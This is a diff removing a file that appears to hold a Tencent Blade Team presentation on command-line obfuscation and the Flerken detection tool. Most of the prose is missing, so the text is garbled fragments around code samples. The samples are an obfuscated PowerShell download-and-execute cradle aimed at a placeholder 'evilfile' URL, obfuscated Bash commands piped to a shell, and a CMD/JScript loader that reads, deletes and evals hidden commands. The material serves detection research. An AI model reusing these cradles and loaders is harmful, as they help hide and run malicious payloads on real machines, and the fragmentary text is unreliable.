@@ -1,231 +1,0 @@
-: 
-  Tencent Blade Team
-
-Tencent Blade Team
-TensorFlow
-TensorFlow TF
-SQLite
-SQLite ChromiumAndroidiOS
-IoT
-Amazon EchoGoogle HomeIoT
-
- 
-Blackhat USADEFCON HITBCanSecWestCSSXCon KCon
-Amazon 
-Amazon  
- 
-Tday 
-
-
-1.  2.  3.  4. 
-
-1. 
-
-1.1 
-
-1.2 
-· PS/CMD[.]exe/Bash · Command Line ·  · 
-
-1.3 ----Windows
-
- 
-
-
-
- 
-
-
-
-PS/CMD
-
- 
-
-
-
-IDS/EDR/
-
-
-
-
-
-1.4 ----Linux
-
- WebLogic
-
-
-
-Bash
-
- 
-
-IDS/EDR
-
-
-
- 
-
-
-
-
-
-
-
-2. 
-
-2.1 PowerShell
-Round 1
-Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://127.0.0.1/evilfile")
-Round 2
-Invoke-Expr'ess'ion (New-Object Net.We'bCli'ent).("DownloadString").Invoke('h'+'ttp://127.0.0.1/evilfile')
-Round 3
-in'vo'ke-exPr'ess'ioN ((('('+'Ne'+'w'+'-'+'Object S')+('y'+'ste')+('m'+'.Net')+('.'+'WebCl')+'ie'+'nt'+((')'+'.Dow'))+('nlo'+'a')+'dS'+('tri'+'n')+(('g(C'+'82h'))+('t'+ 'tp:')+'/'+'/1'+('27'+'.0.')+('0.'+'1/ev'+'i')+(('lfi'+'l'+'eC82)'))).rEPlACE(('C'+'82'),[StriNg][CHaR]34))
-
-2.2 Bash
-Round 1
-whoami
-Round 3
-e\cho $'\x77ho$'\u0000'ami' | bash
-
-Round 2
-echo 'who''ami' | bash
-Round 4
-e\cho $'\x77ho$'\u0000'ami' | $(echo hsab| rev)
-
-Round 5
-e\cho $'\x77ho$'\u0000'ami' | $(echo $(echo aHMK|base64 -d)ab| rev)
-
-2.3 
-· CMDInvoke-DOSfuscation · PowershellInvoke-ObfuscationPS_obfs · BashBashfuscatorbashfuck
-
-2.4 
-PowerShell
-
-APTFIN 7 
-Bashfuscator 
-
-
-3. 
-
-3.1 
-
- 
-
-PS/CMD/Bash
-
- 
-
- Linux 
-
-
-
-3.2 Flerken
-
- NO
-
-
-
-Windows (CMD/Powershell) vs Linux (Bash) 
-
-
-
-
-
-
-
-  ^ , / , `' 
-
- 
-
-Windows Linux 
-
-
-Windows
-
-
-
-Kindle
-
-Octopus Linux
-
-3.3 KindleWindows
-
-Windows (CMD/Powershell) 
-Human/
-
- 
-
-
-
-
-
-
-
-
-
-
-
-
-
- 
-
-
-
-...
-
- 
-
-kindle07 kindlemysql kindllle kinDle kindleisanextremelypopulartool
-
-
- 
-...
-
-3.3 KindleWindows
-
-in'vo'ke-exPr'ess'ioN ((('('+'Ne'+'w'+'-'+'Object S')+('y'+'ste')+('m'+'.Net')+('.'+'WebCl')+'ie'+'nt'+((')'+'.Dow'))+('nlo' +'a')+'dS'+('tri'+'n')+(('g(C'+'82h'))+('t'+'tp:')+'/'+'/1'+('27'+'.0.')+('0 .'+'1/ev'+'i')+(('lfi'+'l'+'eC82)'))).rEPlACE(('C'+'82'),[StriNg][CHaR]34))
-
- 
-
-@set w=wsc@ript /b /e:js@cript %HOMEPATH%\tt.txt @echo try{var fs=new ActiveXObject('Scripting.FileSystemObject');sh=new ActiveXObject('Wscript.Shell');p=sh.ExpandEnvironmentStrings('%%HOM'+'EP ATH%%')+'\\pp.txt';var f=fs.OpenTextFile(p,1,false);for(i=0;i^<4;i++)f.SkipLine();var com='';while(!f.AtEndOfStream)com+=f.ReadLine().substr(1);f.Close();try{fs.De leteFile(p, true);}catch(e){}this[String.fromCharCode(101)+'v'+'al'](com);}catch(e){}; >%HOMEPATH%\tt.txt @copy /y %TMP%\unlock.cmd %HOMEPATH%\pp.txt @echo %w:@=%|cmd
-
- 
-
-
-
-3.3 KindleWindows
-
-
-
-
-
-
-3.4 OctopusBash
-
- Linux   
-
-
-
-
-
-3.4 OctopusBash
-
- 
-YES
-
-3.4 Octopus bash
-· 10Bash ""
-· BashOctopus bash 
-· Simhash Bash
-
-3.5 Flerken Demo
-Flerken demohttps://flerken.pro GitHub link: https://github.com/We5ter/Flerken
-
-4. 
-
-4.1 
-
-· Flerken ·  · 100% ·  · Octopus bash
-
-· Too Complex to be solved ·  ·  ·  · 
-
-
